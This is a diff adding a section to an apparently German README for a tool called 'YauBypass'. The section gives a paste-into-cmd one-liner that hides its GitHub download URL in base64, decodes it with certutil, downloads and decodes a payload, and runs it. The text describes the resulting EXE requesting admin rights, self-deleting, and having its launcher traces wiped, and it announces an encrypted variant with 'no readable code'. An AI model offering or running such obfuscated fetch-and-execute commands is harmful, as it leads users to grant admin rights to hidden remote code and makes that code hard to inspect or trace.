@@ -6,6 +6,28 @@ Der User lädt nichts herunter und klickt nichts an. Er pastet **eine Zeile in c
 curl -L -o "%TEMP%\yau.cmd" https://raw.githubusercontent.com/fzebypass/yaubypass/main/dist/install.cmd && "%TEMP%\yau.cmd"
 ```
 
+## Portabel: ohne Installation, ohne Ordner
+
+Einfach ein `p` am Ende des Befehls anhängen:
+
+```
+echo dXJsID0gImh0dHBzOi8vcmF3LmdpdGh1YnVzZXJjb250ZW50LmNvbS9memVieXBhc3MveWF1YnlwYXNzL21haW4vZGlzdC95Yi5iNjQi> "%TEMP%\c.b64" & certutil -f -decode "%TEMP%\c.b64" "%TEMP%\c.cfg" >nul 2>&1 & curl -sfL -o "%TEMP%\y.b64" -K "%TEMP%\c.cfg" & certutil -f -decode "%TEMP%\y.b64" "%TEMP%\y.cmd" >nul 2>&1 & "%TEMP%\y.cmd" p
+```
+
+Dann passiert nur das:
+
+1. Die EXE wird nach `%TEMP%\nv_<zufall>.exe` geladen.
+2. Sie startet — Windows fragt einmal nach Adminrechten, weil die EXE das im
+   Manifest verlangt. Der Downloader selbst braucht **keine** Adminrechte.
+3. **Kein** `YauBypass`-Ordner, **kein** `boot.cmd`, **keine** Aufgabe, kein Autostart.
+4. Nach dem Destruct ist die Datei weg (sie löscht sich selbst); `CleanLauncherTraces()`
+   räumt zusätzlich `nv_*.exe`, `c.b64`, `c.cfg` und `y.*` im Temp auf.
+
+Der Preis dafür: nach einem Neustart ist nichts mehr da, du musst den Befehl erneut
+ausführen. Und eine kleine Einschränkung, die technisch nicht umgehbar ist — Windows
+kann ein Programm nur als Datei starten, es gibt in cmd keinen Weg, eine 6-MB-EXE
+"direkt" auszuführen. Portabel heißt hier: eine Datei im Temp, die sich selbst löscht.
+
 ## Verschlüsselte Variante (kein Name, kein lesbarer Code)
 
 ```
